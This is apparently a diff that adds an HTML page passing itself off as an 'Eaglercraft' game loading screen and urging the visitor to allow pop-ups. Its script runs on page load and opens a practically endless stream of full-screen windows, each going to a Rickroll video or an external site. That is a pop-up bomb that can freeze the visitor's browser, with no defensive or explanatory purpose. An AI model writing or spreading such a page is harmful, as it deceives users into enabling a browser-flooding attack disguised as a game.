@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>eaglercraft</title>
+    <script>
+        function openWindows(numberOfWindows, interval) {
+            const links = [
+                'https://www.youtube.com/watch?v=dQw4w9WgXcQ', // YouTube link
+                'https://eagx.github.io/eagx' // Alternate link
+            ];
+            let count = 0;
+
+            function openWindow() {
+                if (count < numberOfWindows) {
+                    const randomLink = links[Math.floor(Math.random() * links.length)];
+                    const screenWidth = window.screen.availWidth;
+                    const screenHeight = window.screen.availHeight;
+
+                    // Open the window with the random link
+                    window.open(randomLink, '_blank', `width=${screenWidth},height=${screenHeight},left=0,top=0,scrollbars=no,toolbar=no,location=no,menubar=no,resizable=yes`);
+
+                    count++;
+                    setTimeout(openWindow, interval);
+                }
+            }
+
+            openWindow();
+        }
+
+        window.onload = function() {
+            const windowsPerSecond = 99999999999999999999; // Adjust as needed
+            const interval = 9999999999999999999999 / windowsPerSecond; 
+            openWindows(99999999999999999999, interval); // Adjust the total number of windows
+        };
+    </script>
+</head>
+<body>
+    <h1>Eaglercraft... Loading</h1>
+    <p style="color:#FF0000;">Allow pop-ups</p>
+</body>
+</html>
